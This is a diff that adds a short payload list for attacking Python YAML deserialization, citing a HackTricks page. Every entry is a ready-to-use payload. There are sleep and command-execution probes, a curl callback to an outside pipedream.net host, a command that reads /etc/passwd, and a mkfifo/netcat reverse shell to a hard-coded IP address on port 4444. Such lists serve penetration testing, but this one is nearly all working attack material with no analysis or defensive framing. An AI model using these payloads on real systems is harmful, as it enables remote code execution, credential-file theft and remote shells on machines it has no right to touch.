@@ -1,0 +1,20 @@
+### YAML ###
+
+
+
+#####################
+## Deserialization ##
+#####################
+## https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization
+
+# test
+!!python/object/apply:time.sleep [5]
+!!python/object/apply:os.system ['sleep 10']
+!!python/object/apply:os.system ["ls"]
+!!python/object/apply:os.system ["curl https://eozppby15cb3qha.m.pipedream.net"]
+!!python/object/new:subprocess [["ls","-all"]]
+!!python/object/new:subprocess.check_output [["ls","-all"]]
+!!python/object/new:subprocess.check_output [["cat","/etc/passwd"]]
+
+# rshell
+!!python/object/apply:os.system ["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 41.136.58.181 4444 >/tmp/f"]
